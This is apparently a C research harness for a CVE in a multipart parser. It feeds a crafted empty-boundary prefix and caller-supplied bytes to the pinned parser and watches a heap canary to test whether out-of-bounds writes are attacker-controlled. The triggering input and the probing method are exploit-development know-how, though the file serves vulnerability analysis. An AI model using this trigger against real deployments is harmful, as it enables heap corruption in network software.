/* Bounded negative experiment for CVE-2026-116543: can an attacker choose
 * the bytes the pinned empty-boundary sink writes out of bounds?
 *
 * The pinned parser is compiled verbatim. This driver only supplies callbacks,
 * the fixed CRLFCRLF framing and a caller-supplied hex suffix, then observes
 * the adjacent heap object (the same canary the staged harness uses). */
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ogs-core.h"
#include "multipart_parser.h"

static int cb_data(multipart_parser *p, const char *at, size_t len)
{
	(void)p; (void)at; (void)len; return 0;
}
static int cb_notify(multipart_parser *p)
{
	(void)p; return 0;
}
static const multipart_parser_settings SETTINGS = {
	cb_data, cb_data, cb_data, cb_notify, cb_notify, cb_notify, cb_notify
};

/* Exactly the staged harness prefix: empty-boundary start, one header,
 * CRLFCRLF, then the CR LF that arms s_part_data_boundary with index=0. */
static const char PREFIX[] = "\r\na:\r\n\r\n\r\n";

static int hexval(char c)
{
	if (c >= '0' && c <= '9') return c - '0';
	if (c >= 'a' && c <= 'f') return c - 'a' + 10;
	if (c >= 'A' && c <= 'F') return c - 'A' + 10;
	return -1;
}

int main(int argc, char **argv)
{
	unsigned char body[16 + 512];
	unsigned char *canary;
	const char *hex = (argc > 1) ? argv[1] : "";
	size_t hlen = strlen(hex), suffix, i;
	multipart_parser *p;
	size_t consumed, changed = 0;

	if (hlen % 2 || hlen / 2 > 512)
		return 2;
	suffix = hlen / 2;
	memcpy(body, PREFIX, sizeof(PREFIX) - 1);
	for (i = 0; i < suffix; i++) {
		int hi = hexval(hex[2 * i]), lo = hexval(hex[2 * i + 1]);
		if (hi < 0 || lo < 0)
			return 3;
		body[sizeof(PREFIX) - 1 + i] = (unsigned char)((hi << 4) | lo);
	}

	p = multipart_parser_init("", &SETTINGS);
	if (p == NULL)
		return 4;
	canary = (unsigned char *) malloc(32);
	if (canary == NULL)
		return 5;
	memset(canary, 0x5a, 32);
	consumed = multipart_parser_execute(p, (const char *)body,
	                                    sizeof(PREFIX) - 1 + suffix);
	for (i = 0; i < 32; i++)
		if (canary[i] != 0x5a) changed++;

	printf("SUFFIX_LEN=%zu CONSUMED=%zu CANARY_CHANGED=%zu\nCANARY=",
	       suffix, consumed, changed);
	for (i = 0; i < 12; i++)
		printf("%02x", canary[i]);
	printf("\n");
	return 0;
}
